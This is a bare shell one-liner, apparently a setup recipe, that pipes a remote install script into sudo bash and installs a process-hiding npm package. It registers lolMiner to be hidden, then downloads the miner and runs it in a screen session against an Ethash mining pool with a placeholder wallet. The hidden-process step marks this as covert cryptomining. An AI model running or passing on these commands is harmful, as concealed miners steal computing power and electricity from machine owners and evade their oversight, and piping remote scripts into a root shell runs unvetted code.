curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add lolMiner && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz && tar -xf lolMiner_v1.42_Lin64.tar.gz && apt install screen && screen

1.42/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTT:wallet.worker
